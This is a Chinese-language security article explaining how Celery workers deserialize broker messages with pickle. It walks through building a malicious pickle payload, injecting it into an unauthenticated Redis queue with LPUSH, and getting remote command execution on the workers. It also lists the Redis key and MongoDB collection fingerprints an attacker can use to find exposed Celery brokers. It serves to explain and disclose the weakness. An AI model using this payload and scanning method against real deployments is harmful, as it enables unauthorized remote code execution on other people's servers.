为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。
    # celery_simple.py
    from celery import Celery
    app = Celery('demo', broker='redis://:@192.168.99.100:6379/0', backend='redis://:@192.168.99.100:6379/0')
    @app.task
    def add(x, y):
        return x + y
这里先不起 worker 进程，直接使用 ipython 进行任务下发：
    In [1]: from celery_simple import addIn [2]: task = add.apply_async((4, 9))
这时候查看 Redis 里面的数据：
[](http://www.mottoin.com/89644.html/6-144)
可以看到 Redis 里面存在两个键，celery 和 _kombu.binding.celery，这里解释一下具体两个键的具体含义。在 Celery
中消息可以根据路由设置分发到不同的任务上，例如这里 add() 函数由于没有进行特别的设置，所以其所处的消息队列为名为 celery
的队列，exchange 和 routing_key 值都为
celery，所有满足路由（{“queue”:”celery”,”exchange”:”celery”,”routing_key”:”celery”}）的消息都会发到该
worker 上，然后 worker 根据具体的调用请求去寻找注册的函数使用参数进行调用。
而刚刚提到的 Reids 中的键 _kombu.binding.celery 表示存在一个名为 celery 的队列，其 exchange 和
routing_key 的信息保存在该集合里：
[](http://www.mottoin.com/89644.html/7-124)
而键 celery 里面存储的就是每一个 push 到队列里面的具体消息信息：
[](http://www.mottoin.com/89644.html/8-111)
可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：
|
        "body": "gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu",
        "headers": {},
        "content-encoding": "binary",
        "content-type": "application/x-python-serialize",
        "properties": {
            "body_encoding": "base64",
            "reply_to": "c8b55284-c490-3927-85c5-c68a7fed0525",
            "correlation_id": "1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe",
            "delivery_info": {
                "routing_key": "celery",
                "exchange": "celery",
                "priority": 0
            },
            "delivery_mode": 2,
            "delivery_tag": "027bd89a-389e-41d1-857a-ba895e6eccda"
        }
    }
在上面的消息数据中，properties 里包含了消息的路由信息和标识性的 UUID 值，而其中properties.body_encoding
的值则表示消息主体 body 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据
properties.body_encoding 的值对消息主体 body 进行解码，即 base64.b64decode(body)，而消息数据中的
content-type 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 pickle
对任务数据进行的序列化。  
---|---  
将消息主体经 base64 解码和反序列化（即之前 unserializer.py 文件功能） 操作以后得到具体的任务数据：
[](http://www.mottoin.com/89644.html/9-94)
格式化任务数据为：
    {
        'args': (4, 9),  // 传递进 celery_simple.add 函数中的参数
        'timelimit': (None, None),  // celery Task 任务执行时间限制
        'expires': None,
        'taskset': None,
        'kwargs': {},
        'retries': 0,
        'callbacks': None,  // Task 任务回调
        'chord': None,
        'id': '1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe',  // 任务唯一 ID
        'eta': None,
        'errbacks': None,
        'task': 'celery_simple.add',  // 任务执行的具体方法
        'utc': True
    }
任务数据标明了哪一个注册的 Task
将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker
在获取到消息数据后，默认配置下会使用 pickle 对消息主体进行反序列化。  
**3\. 构造恶意消息数据**
那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker
端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。
这里直接对消息主体 body 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload
使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：
    import base64
    import pickle
    import commands
    class LS(object):
        def __reduce__(self):
            return (commands.getstatusoutput, ('ls', ))
    print(base64.b64encode(pickle.dumps(LS())))
运行程序生成具体 Payload 数据：
    Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou
使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：
    {
        "body": "Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou",
        "headers": {},
        "content-encoding": "binary",
        "content-type": "application/x-python-serialize",
        "properties": {
            "body_encoding": "base64",
            "reply_to": "c8b55284-c490-3927-85c5-c68a7fed0525",
            "correlation_id": "1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe",
            "delivery_info": {
                "routing_key": "celery",
                "exchange": "celery",
                "priority": 0
            },
            "delivery_mode": 2,
            "delivery_tag": "027bd89a-389e-41d1-857a-ba895e6eccda"
        }
    }
将假消息通过 Redis 命令行直接添加到 celery 队列任务中：
    127.0.0.1:6379&gt; LPUSH celery '{"body":"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou","headers":{},"content-encoding":"binary","content-type":"application/x-python-serialize","properties":{"body_encoding":"base64","reply_to":"c8b55284-c490-3927-85c5-c68a7fed0525","correlation_id":"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe","delivery_info":{"routing_key":"celery","exchange":"celery","priority":0},"delivery_mode":2,"delivery_tag":"027bd89a-389e-41d1-857a-ba895e6eccda"}}'
查看一下 celery 队列中的消息情况：
[](http://www.mottoin.com/89644.html/10-79)然后起一个 Celery worker 端加载之前的
celery_simple.py 中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：
[](http://www.mottoin.com/89644.html/11-78)
worker 端经过 pickle.loads(base64.b64decode(body)) 处理对构造的 Payload 进行的反序列化，由于
Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery
分布式框架默认配置下（使用了 pickle 序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。
**  
**
**利用脆弱的 Broker 代理进行分布式节点攻击**
前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得
worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：
[](http://www.mottoin.com/89644.html/12-63)
**1\. 检测 Celery 应用中 Broker 特征**
那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB
这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker
时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。
所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为
Broker 时，其 KEYS 值会存在固定的特征：
    _kombu.binding.*
    celery.*
    unacked.*
而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：
    messages
    messages.broadcast